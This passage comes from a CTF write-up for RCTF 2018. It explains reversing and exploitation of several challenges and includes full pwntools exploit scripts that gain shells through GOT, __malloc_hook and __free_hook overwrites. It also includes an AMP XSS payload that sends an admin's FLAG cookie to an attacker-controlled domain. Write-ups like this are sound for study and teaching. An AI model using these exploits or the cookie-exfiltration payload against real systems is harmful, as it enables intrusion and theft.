ValueError): pass prog.success() We determined that the dump corresponded to libc 2.23-0ubuntu10 (32 bit), which we should have figured out earlier, as it\u0026rsquo;s the 32 bit version of the same libc used in all the other pwnables\u0026hellip; oh well. Let\u0026rsquo;s exploit this. We decided to go with a GOT overwrite (through sw). We noticed that there aren\u0026rsquo;t calls to GOT functions with a controlled first argument (i.e., hijackable to system) after executing MIPS code. However, the instruction reading loop, which happens before executing code, calls strncmp with user input as the first argument. Since we can get a call to puts at the end of code execution to print Unknown instruction, we first overwrote the GOT entry for strncmp to system, and then overwrote the GOT entry for puts to main. When calling puts, the simulator will restart and a line of input will be passed as first argument to strncmp, which is now system. Now we can call system(\u0026quot;sh\u0026quot;) and pop a shell:\n$ cat flag RCTF{5imu_s1mu_sinnu_siml_l_simulator!_7a3dac} Exploit code # #!/usr/bin/env python2 from pwn import * import itertools from hashlib import sha256 def pow(todo=False): if(todo == True): conn = remote(\u0026#34;simulator.2018.teamrois.cn\u0026#34;, 3131) chall = conn.recvuntil(\u0026#34;\\n\u0026#34;).split(\u0026#34;\\n\u0026#34;)[0] alpha = \u0026#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\u0026#39; for a,b,c,d in itertools.product(alpha, repeat=4): if(sha256(chall + a + b + c + d).digest().startswith(\u0026#39;\\0\\0\\0\u0026#39;) == True): sol = a + b + c + d break; conn.sendline(sol) return conn else: return process(\u0026#39;./simulator\u0026#39;) STRCMP_LIBC_OFF = 0x1396b0 SYSTEM_OFF = 0x3a940 MAIN = 0x0804ac58 # strncmp = system() # puts = MAIN code = \u0026#34;\u0026#34;\u0026#34; li $t0, 2155911681 lw $t1, $t0 sub $t1, $t1, {} add $t1, $t1, {} li $t0, 2155911689 sw $t1, $t0 li $t0, 2155911684 li $t1, {} sw $t1, $t0 \u0026#34;\u0026#34;\u0026#34;.format(STRCMP_LIBC_OFF, SYSTEM_OFF, MAIN) prog = log.progress(\u0026#39;Solving PoW\u0026#39;) conn = pow(True) prog.success() prog = log.progress(\u0026#39;Sending code\u0026#39;) conn.sendline(code) conn.sendline(\u0026#39;END\u0026#39;) prog.success() log.info(\u0026#39;Popping shell\u0026#39;) conn.sendline(\u0026#39;sh\u0026#39;) conn.interactive() stringer # Overview # We\u0026rsquo;re given a 64-bit Linux ELF and its libc (2.23). Checksec shows full RELRO, canaries, NX and PIE.\nDuring initialization, a randomly-sized chunk is allocated on the heap to shift the user allocations by a random offset. Then, the program shows a basic menu:\n1. New string 2. Show string 3. Edit string 4. Delete string 5. Exit Option 1 allows us to allocate a string. It asks for a length (up to 256), then it callocs that length and copies our input into it. We can allocate up to 32 strings. Option 2 just outputs don't even think about it. Option 3 can be used to \u0026ldquo;edit\u0026rdquo; a string. It asks for an offset inside of a string, and increments the byte at that offset. We can do at most five increments per string. Option 4 frees a string.\nVulnerabilities # The first thing we notice is an obvious use-after-free triggered by deleting a string:\nvoid delete_string() { unsigned int idx; char *str; printf(\u0026#34;please input the index: \u0026#34;); idx = read_int(); if (idx \u0026gt; 31) die(\u0026#34;not a validate index\u0026#34;); str = strings[idx]; if (!str) die(\u0026#34;not a validate index\u0026#34;); free(str); } Where strings is a global array of pointers to allocated strings. Entries in this array are added by the new string option, and the edit string option considers an index valid if its entry is not NULL. However, delete_string does not set the entry to NULL after freeing. Therefore, we can edit a freed string, or free a string multiple times.\nThere\u0026rsquo;s another, more subtle issue when adding a string. This is the code for new_string:\nvoid new_string() { long i; unsigned int len; char *str; if (num_strings \u0026gt; 32) die(\u0026#34;too many string\u0026#34;); printf(\u0026#34;please input string length: \u0026#34;); len = read_int(); if (!len || len \u0026gt; 256) die(\u0026#34;invalid size\u0026#34;); str = (char *) calloc(len, 1); if (!str) die(\u0026#34;memory error\u0026#34;); printf(\u0026#34;please input the string content: \u0026#34;); read_line(str, len); for (i = 0; i \u0026lt;= 31 \u0026amp;\u0026amp; strings[i]; ++i); if (i \u0026gt; 31) die(\u0026#34;too many string\u0026#34;); strings[i] = str; printf(\u0026#34;your string: %s\\n\u0026#34;, str); ++num_strings; string_len[i] = len; } And this is the code for read_line:\nvoid read_line(char *buf, unsigned int size) { char c; unsigned int i; for (i = 0; i \u0026lt; size; ++i) { c = 0; if (read(0, \u0026amp;c, 1uLL) \u0026lt; 0) die(\u0026#34;read() error\u0026#34;); buf[i] = c; if (c == \u0026#39;\\n\u0026#39;) break; } buf[size - 1] = 0; } It seems that the string creation could be used to leak memory. Notice the behaviour of read_line when it encounters a newline: it stops reading, it doesn\u0026rsquo;t replace the newline with a zero, and then zero-terminates the string based on the buffer size, not on the actual read length. Then, new_string prints out the string from the heap chunk using %s, which stops at the zero terminator. So, if we allocate a string on top of a free chunk that contains some data we want to leak (e.g., pointers), then send a short string (e.g., only a newline, so that we only overwrite one byte), we\u0026rsquo;ll leak the data up to the first zero. This sounds really nice, until you notice the string is calloced, so any data in the free chunk is destroyed. However, as we\u0026rsquo;ll see, there\u0026rsquo;s a way around that\u0026hellip;\nBreaking calloc # Apparently, we don\u0026rsquo;t have any leaks. I fiddled for a bit, trying to come up with a way to exploit this challenge using only the UAF on edit and delete, but I got nowhere. So I went back to the almost-but-not-quite infoleak I described earlier, asking myself whether there are cases in which calloc doesn\u0026rsquo;t clear the memory. Mmapped chunks came to mind. Normally, the GNU libc allocator asks the OS for memory (either through sbrk or mmap), and then hands out chunks of it to the application. However, for particularly big allocations, the allocator will directly mmap the chunk and hand it out to the application. This is signaled by the IS_MMAPPED flag in the chunk header. Obviously, mmaped memory is already zeroed by the OS, so calloc shouldn\u0026rsquo;t need to clear it. The source code confirms this:\nmem = _int_malloc (av, sz); /* ... */ p = mem2chunk (mem); /* Two optional cases in which clearing not necessary */ if (chunk_is_mmapped (p)) { if (__builtin_expect (perturb_byte, 0)) return memset (mem, 0, sz); return mem; } Here, chunk_is_mmapped just checks whether IS_MMAPPED is set for the chunk. Unless malloc\u0026rsquo;s debug features are enabled (they\u0026rsquo;re not here), perturb_byte is zero, so nothing is cleared. We\u0026rsquo;re not interested in real mmapped chunks (we can\u0026rsquo;t allocate them anyway), but with some massaging we can exploit the UAF to edit a freed chunk\u0026rsquo;s header and set the IS_MMAPPED flag. If then _int_malloc returns our chunk to __libc_calloc, it won\u0026rsquo;t be cleared. Profit!\nLeaking libc # We\u0026rsquo;ll need to know libc\u0026rsquo;s position in memory for further exploitation. The typical way to leak libc through a heap leak is to read a link pointer from the first or the last chunk in the unsorted bin, as it will point inside main_arena in libc\u0026rsquo;s data section. So, in our case, we\u0026rsquo;ll have to set IS_MMAPPED for an unsorted chunk, then allocate a string on top of it. Clearly, we don\u0026rsquo;t want this allocation to mess with the flag we just set. The best path to take is an exact fit:\n/* Take now instead of binning if exact fit */ if (size == nb) { set_inuse_bit_at_offset (victim, size); if (av != \u0026amp;main_arena) victim-\u0026gt;size |= NON_MAIN_ARENA; check_malloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; } So this is what we\u0026rsquo;ll do (I chose the smallest sizes possible - string size is 8 bytes less than chunk size):\nAllocate a 0xB0 smallchunk (call it dangling), followed by a 0x20 fastchunk (to avoid consolidation of free chunks with the top chunk); Free dangling: this sets up the UAF to corrupt the flags; Allocate a 0x20 fastchunk (call it spacer), followed by a 0x90 smallchunk (call it victim) - note that those exactly fill dangling; Free victim, which goes into the unsorted bin; Edit dangling (its saved length is big enough to reach victim), incrementing the LSB of victim\u0026rsquo;s size (offset 0x18) twice to set IS_MMAPPED - that\u0026rsquo;s why we needed spacer, otherwise victim\u0026rsquo;s header would\u0026rsquo;ve been before the string data; Allocate a 0x90 chunk with \\n content, which will exactly fit into victim, and watch the challenge spew out a libc address (the LSB is corrupted to \\n, but that\u0026rsquo;s irrelevant). Getting a shell # Now that we have libc, there are a bunch of attacks we can do to gain code execution. I chose to allocate a fake fastchunk on top of __malloc_hook and jump to a onegadget to pop a shell. Because the memory around __malloc_hook contains library function pointers (0x7F top byte) and NULL pointers, interpreting the data at \u0026amp;__malloc_hook-27 as a quadword yields 0x7F, which is a valid fastchunk header for the 0x70 fastbin. Let\u0026rsquo;s start with a fastbin dup through the UAF. We allocate two 0x70 fastchunks (dup and mid), then free dup, mid, and dup again, thus bypassing the fastbin double-free checks. The fastbin freelist is now dup -\u0026gt; mid -\u0026gt; dup. Now we allocate a 0x70 fastchunk (which will reuse dup) and set the fd pointer to \u0026amp;__malloc_hook-27-8 (accounting for prev_size). The fastbin freelist is now mid -\u0026gt; dup -\u0026gt; \u0026amp;__malloc_hook-27-8. We just need a couple 0x70 allocations to get the first two out of the way, and the next allocation will return our fake chunk, allowing us to overwrite __malloc_hook. One more allocation to trigger the hook, and we have a shell!\n$ cat flag RCTF{Is_th1s_c1-1unk_m4pped?_df3ac9} Exploit code # #!/usr/bin/env python2 from pwn import * p = remote(\u0026#39;stringer.2018.teamrois.cn\u0026#39;, 7272) chunk_idx = 0 def menu(n): p.recvuntil(\u0026#39;choice: \u0026#39;) p.sendline(str(n)) def alloc(size, content=\u0026#39;\u0026#39;, final=False): global chunk_idx menu(1) p.recvuntil(\u0026#39;length: \u0026#39;) p.sendline(str(size)) if final: return p.recvuntil(\u0026#39;content: \u0026#39;) p.send(content + (\u0026#39;\\n\u0026#39; if len(content) \u0026lt; size else \u0026#39;\u0026#39;)) p.recvuntil(\u0026#39;your string: \u0026#39;) s = p.recvuntil(\u0026#39;\\n1.\u0026#39;)[:-3] chunk_idx += 1 return (chunk_idx-1, s) def increment_byte(idx, offset): menu(3) p.recvuntil(\u0026#39;index: \u0026#39;) p.sendline(str(idx)) p.recvuntil(\u0026#39;index: \u0026#39;) p.sendline(str(offset)) def free(idx): menu(4) p.recvuntil(\u0026#39;index: \u0026#39;) p.sendline(str(idx)) prog = log.progress(\u0026#39;Leaking libc\u0026#39;) dangling, _ = alloc(0xa8) alloc(0x18) # stop consolidation with top chunk free(dangling) alloc(0x18) # spacer victim, _ = alloc(0x88) free(victim) # set IS_MMAPPED on freed victim for _ in range(2): increment_byte(dangling, 0x18) # exact fit into victim unsorted _, leak = alloc(0x88) libc_base = u64(leak.ljust(8, \u0026#39;\\x00\u0026#39;)) - 0x3c4b0a prog.success(\u0026#39;@ 0x{:012x}\u0026#39;.format(libc_base)) prog = log.progress(\u0026#39;Double-freeing fastchunk\u0026#39;) dup, _ = alloc(0x68) mid, _ = alloc(0x68) free(dup) free(mid) free(dup) prog.success() prog = log.progress(\u0026#39;Linking fake chunk\u0026#39;) malloc_hook = libc_base + 0x3c4b10 fake_fast_addr = malloc_hook - 27 - 8 alloc(0x68, p64(fake_fast_addr)) alloc(0x68) # remove mid alloc(0x68) # remove dup prog.success() prog = log.progress(\u0026#39;Overwriting __malloc_hook\u0026#39;) one_gadget = libc_base + 0xf02a4 alloc(0x68, \u0026#39;A\u0026#39;*19 + p64(one_gadget)) prog.success() log.info(\u0026#39;Popping shell\u0026#39;) alloc(0x18, final=True) p.interactive() Simple vm # We\u0026rsquo;re given two files, a vm and a bytecode. By disassembling the vm it\u0026rsquo;s easy to see what each instruction does and how it\u0026rsquo;s saved in memory - it\u0026rsquo;s all in sub_400896. As the function itself is quite long I won\u0026rsquo;t copy it here, it\u0026rsquo;s enough to see what each instruction does. In the following table, all items in \u0026lt; and \u0026gt; brackets are the values given right after the opcode.\nopcode size in bytes description 00 5 exit(\u0026lt;exitcode\u0026gt;) 01 5 jump \u0026lt;address\u0026gt; 02 9 mov *\u0026lt;address\u0026gt;, \u0026lt;value\u0026gt; 03 5 c = *\u0026lt;address\u0026gt; 04 5 *\u0026lt;address\u0026gt; = c 05 5 d = *\u0026lt;address\u0026gt; 06 5 *\u0026lt;address\u0026gt; = d 07 1 c += d 08 1 c = ~(c \u0026amp; d) 09 1 Unused 0A 1 c = getchar() 0B 1 putchar(c) 0C 9 if(*\u0026lt;address\u0026gt; != 0) { *\u0026lt;address\u0026gt; -= 1; jump \u0026lt;target\u0026gt; } 0D 1 c += 1 0E 1 d += 1 0F 1 c = d 10 1 d = c 11 5 c += \u0026lt;value\u0026gt; 12 1 c = *d 13 1 c = *c 14 5 c = \u0026lt;value\u0026gt; 15 5 d = \u0026lt;value\u0026gt; 16 1 *d = c 17 1 c -= d 18 5 if(c != 0) { jump \u0026lt;target\u0026gt; } 66 1 Implicitly used as a nop c and d are the two registers the vm can work with.\nHaving a full instruction mapping, I disassembled the given bytecode into this:\n# All values are hex 000: jmp 030 005: encoded data 030: d = 100 035: d++ 036: c = *d 037: putchar(c) 038: if byte *100: dec byte *100 jmp 035 041: nop 042: d = 110 047: d += 1 048: c = getchar() 049: nop 04A: *d = c 04B: if byte *110: dec byte *110 jmp 047 054: nop 055: c = *140 05A: d = c 05B: c += F1 060: c = *c 061: *143 = c 066: c = ~(c \u0026amp; d) 067: *141 = c 06C: d = c 06D: c = *140 072: c = ~(c \u0026amp; d) 073: *142 = c 078: c = *141 07D: c = *143 082: c = ~(c \u0026amp; d) 083: d = c 084: c = *142 089: c = ~(c \u0026amp; d) 08A: *144 = c 08F: nop 090: c = *140 095: c += 0xF1 09A: d = c 09B: c = *144 0A0: *d = c 0A1: d = *140 0A6: d += 1 0A7: *140 = d 0AC: if byte *145: dec byte *145 jmp 055 0B5: nop 0B6: c = *146 0BB: c += 5 0C0: c = *c 0C1: d = c 0C2: c = *146 0C7: c += 111 0CC: c = *c 0CD: c -= d 0CE: if c: jmp 160 0D3: if byte *146: dec byte *146: jmp 0B6 0DC: jmp 176 101: \u0026#39;Input Flag:\u0026#39; 151: \u0026#39;Wrong\u0026#39; 157: \u0026#39;Right\u0026#39; 160: d = 150 165: d += 1 166: c = *d 167: putchar(c) 168: if byte *150: dec byte *150 jmp 165 171: exit(0) 176: d = 156 17B: d += 1 17C: c = *d 17D: putchar(c) 17E: if byte *150: dec byte *150 jmp 17B 187: exit(0) The code reads the flag into offset 0x111, transforms it in instructions 055-0B5 and compares it to the encrypted data at 005, jumping to 176 and printing Right if the flag is correct. We converted the transformation into a python function to find each individual character of the flag. Since each one was checked individually we could bruteforce each one and build up our result with the following code:\n#!/usr/bin/env python2 def transform(c, pos): m140 = 0x20 + pos m141 = ~(c \u0026amp; m140) m142 = ~(m140 \u0026amp; m141) m144 = ~(m142 \u0026amp; ~(m141 \u0026amp; c)); return m144 with open(\u0026#39;p.bin\u0026#39;, \u0026#39;rb\u0026#39;) as f: code = f.read() magic = map(ord, code[5:5+32]) flag = \u0026#39;\u0026#39; for pos in range(32): for c in range(0x20, 0x7f): if transform(c, pos) == magic[pos]: flag += chr(c) break print(flag) Which outputs 09a71bf084a93df7ce3def3ab1bd61f6. The flag is thus RCTF{09a71bf084a93df7ce3def3ab1bd61f6}\nBabyre # We are given two files, a 32 bit executable and a file called out. At first the program doesn\u0026rsquo;t print anything when executed, but by opening it in a disassembler it\u0026rsquo;s easy to see that it accepts a string and then a number, which has to be between 10 and 32. I started playing around with these two inputs only to realize they weren\u0026rsquo;t actually used in producing the output.\nsub_80488E0 # This is where the magic happens. The function reads a string and mangles each of the characters to a 32 bit integer, which is then printed in hex.\nint __cdecl sub_80488E0(char *s, int a2, int a3, int a4, int a5, int a6) { unsigned int v6; // ST4C_4 signed int i; // [esp+1Ch] [ebp-1Ch] memset(s, 0, 0x20u); scanf(\u0026#34;%s\u0026#34;, s); for ( i = 0; i \u0026lt;= 29; ++i ) { v6 = sub_804868B(s[i], __PAIR__(a3, a2), a4, a6, a5); printf(\u0026#34;%lx\\n\u0026#34;, v6); } return i; } The only called function, sub_804868B, is responsible for the mangling of individual characters. While it gets a lot of parameters, in the end the last three are useless and __PAIR__(a3, a2) is hardcoded in the main function as 0x1D082C23A72BE4C1LL. Let\u0026rsquo;s have a look at sub_804868B:\nunsigned int __cdecl sub_804868B(unsigned int a1, unsigned __int64 a2, int a3, int a4, int a5) { unsigned __int64 v5; // rax unsigned int i; // [esp+1Ch] [ebp-ACh] unsigned int j; // [esp+24h] [ebp-A4h] int v10; // [esp+28h] [ebp-A0h] int s[32]; // [esp+2Ch] [ebp-9Ch] unsigned int v12; // [esp+ACh] [ebp-1Ch] v12 = __readgsdword(0x14u); memset(s, 0, 0x20u); for ( i = 0; i \u0026lt;= 0x1D; ++i ) s[i] = (4 * a3 + v10) ^ a5 ^ a4; for ( j = 0; j \u0026lt;= 0x20F; ++j ) { v5 = a2 \u0026gt;\u0026gt; (j \u0026amp; 0x1F); if ( j \u0026amp; 0x20 ) LODWORD(v5) = HIDWORD(v5); a1 = (a1 \u0026gt;\u0026gt; 1) ^ (((unsigned int)v5 ^ a1 ^ (a1 \u0026gt;\u0026gt; 16) ^ (0x5C743A2E \u0026gt;\u0026gt; (((a1 \u0026gt;\u0026gt; 1) \u0026amp; 1) + 2 * (2 * (((a1 \u0026gt;\u0026gt; 20) \u0026amp; 1) + 2 * (2 * ((a1 \u0026amp; 0x80000000) != 0) + ((a1 \u0026gt;\u0026gt; 26) \u0026amp; 1))) + ((a1 \u0026gt;\u0026gt; 9) \u0026amp; 1))))) \u0026lt;\u0026lt; 31); } return a1; } As you can see, a3, a4 and a5 are only used to produce s, which is never used again and can thus be ignored. All we\u0026rsquo;re left with is the big for loop which modifies a1, the character the function is working on. Instead of writing a reverse function for this loop I just used a lookup table, thus solving the challenge with this code (yes, it\u0026rsquo;s kind of ugly, but it works):\n#include \u0026lt;cstdio\u0026gt; #include \u0026lt;cstdint\u0026gt; #include \u0026lt;bits/stdc++.h\u0026gt; using namespace std; uint32_t f(uint32_t a1) { uint32_t j; uint64_t a2 = 0x1D082C23A72BE4C1LL, v5; for ( j = 0; j \u0026lt;= 0x20F; ++j ) { v5 = a2 \u0026gt;\u0026gt; (j \u0026amp; 0x1F); if ( j \u0026amp; 0x20 ) v5 = v5 \u0026gt;\u0026gt; 32; a1 = (a1 \u0026gt;\u0026gt; 1) ^ (((unsigned int)v5 ^ a1 ^ (a1 \u0026gt;\u0026gt; 16) ^ (0x5C743A2E \u0026gt;\u0026gt; (((a1 \u0026gt;\u0026gt; 1) \u0026amp; 1) + 2 * (2 * (((a1 \u0026gt;\u0026gt; 20) \u0026amp; 1) + 2 * (2 * ((a1 \u0026amp; 0x80000000) != 0) + ((a1 \u0026gt;\u0026gt; 26) \u0026amp; 1))) + ((a1 \u0026gt;\u0026gt; 9) \u0026amp; 1))))) \u0026lt;\u0026lt; 31); } return a1; } int main() { map\u0026lt;string, char\u0026gt; m; for(uint32_t i = 0; i \u0026lt;= 0xFF; i++) { char buf[10]; sprintf(buf, \u0026#34;%08X\u0026#34;, f(i)); m[string(buf)] = i; } char out[32]; ifstream s(\u0026#34;out\u0026#34;); for(int i = 0; i \u0026lt; 30; i++) { string l; s \u0026gt;\u0026gt; l; if(m.find(l) == m.end()) printf(\u0026#34;WUT\\n\u0026#34;); out[i] = m[l]; } out[30] = 0; printf(\u0026#34;%s\\n\u0026#34;, out); } Which prints RCTF{Kee1o9_1s_a1ready_so1ved}, our flag.\nJust a small detail: I had to break the lines in the out file up into 8 character chunks manually, they were in 16 byte lines for some reason.\nSign # We are given a 64 bit elf that segfaults on execution. By running a good old-fashioned\nstrings --encoding=l sign.exe |grep RCTF we get the flag RCTF{WelCOme_To_RCTF}\nAMP # We are given a page with an obsvious XSS and a quite strict CSP policy. You can submit the page with the injection to the admin. A cookie FLAG is set, which probably means we have to steal that cookie from the admin.\nThe page is using AMP, so we are going to look for a way to bypass the CSP using an AMP custom element. AMP has a feature that allows you to insert some placeholders into a URL that are populated by javascript at runtime, called: https://github.com/ampproject/amphtml/blob/master/spec/amp-var-substitutions.md The feature we need is CLIENT_ID, that populates the placeholder with the value of a cookie. In our case: CLIENT_ID(FLAG) will be replaced by the flag value. At this point, we just need an AMP element available in the default package and capable of loading a URL using variable substitutions. We quickly found amp-pixel, that does just that.\nOur final payload was:\n\u0026lt;amp-pixel src=\u0026#34;https://controlled_domain.com/?CLIENT_ID(FLAG)\u0026#34; layout=\u0026#34;nodisplay\u0026#34;\u0026gt;\u0026lt;/amp-pixel\u0026gt; And the flag: RCTF{El_PsY_CONGRO0_sg0}\nRNote3 # Attachment\nFirst checks: # RNote3: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=3ec425669dba0efe3033ff8bffdb0b4a9eb9ee4e, stripped \u0026lsquo;/home/marcof/ctfs/rctf2018/rnote/RNote3\u0026rsquo; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled\nReversing # We reversed all the binary with no particular problems. We started looking for some bugs in heap managment but everythink looked fine. We noticed sub_B98( ) (which i renominated custom_read(buff,size)) wasn\u0026rsquo;t perfect, in fact it would stop reading characters once a \\n was reached but it would still add a \\x00 at buff[size - 1]. Also we soon found a stack buffer overflow in sub_102D() (edit_note()). Still canary was preventing us to take control over the $rip.\nThe right vuln # After some time we finally found a usable vulnerability. In function delete_note() (sub_F2B(), refer to decompiled code below) stack variable \u0026ldquo;selected_note\u0026rdquo; is not initialized to 0 and its loaded at $rbp - 0x18, exactly as it is in edit_note() function. This means that if i first call edit_note() on one of my allocated structures (note structure also provided below), lets say with title \u0026ldquo;aaa\\n\u0026rdquo; and later call delete_note() looking for a structure with a non existing title (\u0026quot;\\n\u0026quot;) I would end up freeing the \u0026ldquo;aaa\\n\u0026rdquo; note without setting to 0 the respective global pointer saved in .bss segment. This its clearly a use after free vulnerability.\nunsigned __int64 delete_note() { signed int i; // [rsp+4h] [rbp-1Ch] note *selected_note; // [rsp+8h] [rbp-18h] char note_title; // [rsp+10h] [rbp-10h] unsigned __int64 canary; // [rsp+18h] [rbp-8h] canary = __readfsqword(0x28u); printf(\u0026#34;please input note title: \u0026#34;); my_custom_read(\u0026amp;note_title, 8u); for ( i = 0; i \u0026lt;= 31; ++i ) { if ( notes[i] \u0026amp;\u0026amp; !strncmp(\u0026amp;note_title, notes[i]-\u0026gt;title, 8uLL) ) { selected_note = notes[i]; break; } } if ( selected_note ) { free(selected_note-\u0026gt;content); free(selected_note); notes[i] = 0LL; } else { puts(\u0026#34;not a valid title\u0026#34;); } return __readfsqword(0x28u) ^ canary; } struct note { char title[8]; __int64 size; char *content; }; Exploitation # Using the newly found vulnerability we were able to both leak libc and heap addresses usign the unsorted chunk fd and bk pointers which are saved on the heap after a call to free(). Libc was provided so it was easy to calculate offsets to system() function. Once we got a heap address we were able to craft a fake big chunk inside the double linked list of unsorted ones to make it overlap existing note structures, change their \u0026ldquo;content\u0026rdquo; pointer and gain arbitrary write.The final step is trivial, we overwrite free_hook(), we put a \u0026ldquo;/bin/sh\\x00\u0026rdquo; string inside a note content, we free such note.\nFinal exploit with some comments # from pwn import * from time import sleep import sys import os # context.log_level = \u0026#34;debug\u0026#34; host = \u0026#39;localhost\u0026#39; port = 4000 host_remote = \u0026#34;rnote3.2018.teamrois.cn\u0026#34; port_remote = 7322 binary_path = \u0026#39;./RNote3\u0026#39; libc_path = \u0026#39;./libc.so.6\u0026#39; start_gdb = False gdb_cmds = \u0026#34;\u0026#34;\u0026#34; source /home/marcof/peda/peda.py # sbp 0xf5b # sbp 0xfe2 b system c \u0026#34;\u0026#34;\u0026#34; if libc_path is not None: libc = ELF(libc_path) if binary_path is not None: elf = ELF(binary_path) mode = sys.argv[1] if len(sys.argv) \u0026gt; 1 else \u0026#39;\u0026#39; if mode == \u0026#39;remote\u0026#39;: r = remote(host_remote,port_remote) elif mode == \u0026#39;local\u0026#39;: r = remote(host,port) else: r = process(\u0026#39;./RNote3\u0026#39;) if start_gdb: if(os.environ.get(\u0026#39;TMUX\u0026#39;,False)): context.terminal = [\u0026#39;tmux\u0026#39;, \u0026#39;splitw\u0026#39;, \u0026#39;-h\u0026#39;] gdb.attach(r,gdb_cmds) else: log.warning(\u0026#39;Start a tmux session to get gdb attached!\u0026#39;) def new_note(note_title,note_size,note_content): r.sendline(\u0026#39;1\u0026#39;) r.recvuntil(\u0026#34;input title: \u0026#34;) r.send(note_title) r.recvuntil(\u0026#34;content size: \u0026#34;) r.sendline(str(note_size)) r.recvuntil(\u0026#34; input content: \u0026#34;) r.send(note_content) def view_note(note_title): r.sendline(\u0026#39;2\u0026#39;) r.recvuntil(\u0026#34;note title: \u0026#34;) r.send(note_title) r.recvuntil(\u0026#34;title: \u0026#34;) title = r.recvuntil(\u0026#34;note cont\u0026#34;)[:-9] r.recvuntil(\u0026#34;ent: \u0026#34;) content = r.recvuntil(\u0026#39;\\n\u0026#39;)[:-1] return(title,content) def edit_note(note_title,new_content): r.sendline(\u0026#39;3\u0026#39;) r.recvuntil(\u0026#34;input note title: \u0026#34;) r.send(note_title) r.recvuntil(\u0026#34; new content: \u0026#34;) r.send(new_content) def delete_note(note_title): r.sendline(\u0026#39;4\u0026#39;) r.recvuntil(\u0026#34;note title: \u0026#34;) r.send(note_title) def exit(): r.sendline(\u0026#39;5\u0026#39;) r.recvuntil(\u0026#34;5. Exit\u0026#34;) ## BEGIN EXPLOIT libc_base_offset = 0x3c4b78 ##computed manually looking at 3-4 executions with gdb ## LIBC LEAK new_note(\u0026#34;aaa\\n\u0026#34;,200,\u0026#34;A\u0026#34;*200) new_note(\u0026#34;bbb\\n\u0026#34;,200,\u0026#34;B\u0026#34;*200) edit_note(\u0026#34;aaa\\n\u0026#34;,\u0026#34;X\u0026#34;*200) delete_note(\u0026#34;S\\n\u0026#34;) ## we use a non existing title to trigger vulnerability libc_leak = view_note(\u0026#34;\\n\u0026#34;)[1] libc_leak = u64(libc_leak.ljust(8,\u0026#39;\\x00\u0026#39;)) libc_base_eff = libc_leak - libc_base_offset system_eff = libc_base_eff + libc.symbols[\u0026#39;system\u0026#39;] free_hook_eff = libc_base_eff + libc.symbols[\u0026#39;__free_hook\u0026#39;] log.info(\u0026#34;libc leak: {}\u0026#34;.format(hex(libc_leak))) log.info(\u0026#34;libc base: {}\u0026#34;.format(hex(libc_base_eff))) log.info(\u0026#34;system addr: {}\u0026#34;.format(hex(system_eff))) log.info(\u0026#34;free_hook addr: {}\u0026#34;.format(hex(free_hook_eff))) ## clean state - heap is fine and uncorrupted here, no free chunks are present ## HEAP LEAK new_note(\u0026#34;aaa\\n\u0026#34;,200,\u0026#34;/bin/sh\\x00\u0026#34;+\u0026#34;A\u0026#34;*100+\u0026#34;\\n\u0026#34;) new_note(\u0026#34;ccc\\n\u0026#34;,240,\u0026#34;C\u0026#34;*240) ## I had to tune this value in order to make the next note_struct in the heap new_note(\u0026#34;ddd\\n\u0026#34;,200,\u0026#34;D\u0026#34;*200) ## to start at something like 0x????00 and continue to exploit the same new_note(\u0026#34;eee\\n\u0026#34;,200,\u0026#34;E\u0026#34;*200) ## vulnerability new_note(\u0026#34;fff\\n\u0026#34;,200,\u0026#34;F\u0026#34;*200) delete_note(\u0026#34;ddd\\n\u0026#34;) edit_note(\u0026#34;eee\\n\u0026#34;,\u0026#34;Y\u0026#34;*200) delete_note(\u0026#34;S\\n\u0026#34;) heap_leak = view_note(\u0026#34;\\n\u0026#34;)[1] heap_leak = u64(heap_leak.ljust(8,\u0026#39;\\x00\u0026#39;)) log.info(\u0026#34;heap leak: {}\u0026#34;.format(hex(heap_leak))) new_note(\u0026#34;ddd\\n\u0026#34;,200,\u0026#34;D\u0026#34;*200) new_note(\u0026#34;eee\\n\u0026#34;,200,\u0026#34;E\u0026#34;*200) heap_top = heap_leak + 0x2b0 ## clean state - heap is fine and uncorrupted here, no free chunks are present ## ARBITRARY WRITE new_note(\u0026#34;mmm\\n\u0026#34;,200,\u0026#34;M\u0026#34;*200) new_note(\u0026#34;nnn\\n\u0026#34;,200,\u0026#34;N\u0026#34;*200) new_note(\u0026#34;ooo\\n\u0026#34;,200,\u0026#34;O\u0026#34;*200) new_note(\u0026#34;ppp\\n\u0026#34;,200,\u0026#34;P\u0026#34;*200) m_chunk = heap_leak + 0x2d0 n_chunk = m_chunk + 0xf0 o_chunk = n_chunk + 0xf0 p_chunk = o_chunk + 0xf0 edit_note(\u0026#34;ooo\\n\u0026#34;,\u0026#34;O\u0026#34;*200) delete_note(\u0026#34;S\\n\u0026#34;) delete_note(\u0026#34;mmm\\n\u0026#34;) edit = p64(libc_leak) + p64(n_chunk + 0x20) edit += \u0026#34;O\u0026#34;*(200-len(edit)) edit_note(\u0026#34;\\n\u0026#34;,edit) edit = \u0026#34;N\u0026#34;*16 + p64(0x00) + p64(0x111) edit += p64(o_chunk) + p64(m_chunk) edit += \u0026#34;N\u0026#34;*(200-len(edit)) edit_note(\u0026#34;nnn\\n\u0026#34;,edit) edit = \u0026#34;Q\u0026#34;*0xb0 + p64(0x00) + p64(0x10) + p64(free_hook_eff) + \u0026#34;\\n\u0026#34; new_note(\u0026#34;qqq\\n\u0026#34;,256,edit) edit_note(\u0026#34;\\n\u0026#34;,p64(system_eff)+\u0026#34;\\n\u0026#34;) delete_note(\u0026#34;aaa\\n\u0026#34;) r.interactive() Flag # RCTF{P1e4se_Be_C4refu1_W1th_Th3_P0inter_3c3d89}\nSimple re # The given file seems at first malformed, having almost no sensible code and an entry point pointing outside of the defined sections. After a bit of debugging it became clear that a small loader would xor the code section with 0xCC and then jump to it. With this in mind I wrote a small script to undo the xor encryption and fix the entry point. Now it was time to actually reverse the logic inside and find the flag.\nThe decoy # The first thing the program would do at startup is fork and split into a first thread that asked for the flag and checked it, a second one that, after playing around with some pthread calls, jumped back into a section of main previously unmarked by ida and basically wait for the first thread to trigger a debugger breakpoint. It was at this time that I fell for the decoy: I only considered the first thread only and fully reversed the encryption algorithm it used, only to get a nonprintable flag - how frustrating!\nFixing it up # Afterwards we went back to the challenge with a teammate, focusing more on both threads. The first thread would encrypt the input and, before checking it, trigger an int 